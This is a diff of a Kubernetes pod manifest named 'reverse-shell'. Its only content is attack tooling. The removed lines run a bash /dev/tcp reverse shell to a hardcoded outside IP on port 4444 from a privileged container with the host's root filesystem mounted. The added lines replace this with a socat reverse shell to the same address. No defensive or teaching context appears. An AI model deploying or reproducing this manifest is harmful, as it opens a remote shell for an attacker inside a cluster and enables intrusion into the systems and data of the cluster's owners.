@@ -6,26 +6,18 @@ metadata:
   labels:
     app: reverse-shell
 spec:
-  restartPolicy: Never  # Set the restart policy at the pod level
+  restartPolicy: Never
   containers:
     - name: reverse-shell
-      image: ubuntu:latest  # You can also use a different image that has bash installed
+      image: ubuntu:latest
       command: ["/bin/bash", "-c"]
       args:
         - |
-          # Install curl if it's not already installed
-          apt-get update && apt-get install -y curl && \
-          # Create the reverse shell script
-          echo "bash -i >& /dev/tcp/23.27.169.114/4444 0>&1" > /tmp/reverse_shell.sh && \
-          chmod +x /tmp/reverse_shell.sh && \
-          # Execute the reverse shell
-          /tmp/reverse_shell.sh
+          # Install socat
+          apt-get update && apt-get install -y socat && \
+          # Create and execute the reverse shell
+          socat TCP:23.27.169.114:4444 EXEC:/bin/bash,pty
       securityContext:
-        privileged: true
-      volumeMounts:
-        - mountPath: /host
-          name: noderoot
-  volumes:
-    - name: noderoot
-      hostPath:
-        path: /
+        privileged: false  # Set to false unless needed
+      tty: true
+      stdin: true
